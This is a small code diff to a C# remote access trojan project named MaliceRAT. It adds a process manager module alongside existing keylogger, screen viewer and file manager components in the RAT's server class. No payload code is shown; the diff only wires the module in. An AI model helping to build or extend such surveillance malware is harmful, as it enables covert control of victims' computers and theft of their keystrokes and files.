@@ -19,6 +19,7 @@ namespace MaliceRAT.RatServer
         public Heartbeat heartbeatManager;
         public Features.SystemInformation systemInformation;
         public FileManager fileManager;
+        public ProcessManager processManager;
         public KeyLogger keyLogger;
         #endregion
 
@@ -76,6 +77,7 @@ namespace MaliceRAT.RatServer
             screenViewer = new ScreenViewer(this);
             heartbeatManager = new Heartbeat(HeartbeatInterval, this);
             keyLogger = new KeyLogger(this);
+            processManager = new ProcessManager(this);
             #endregion
         }
         #endregion
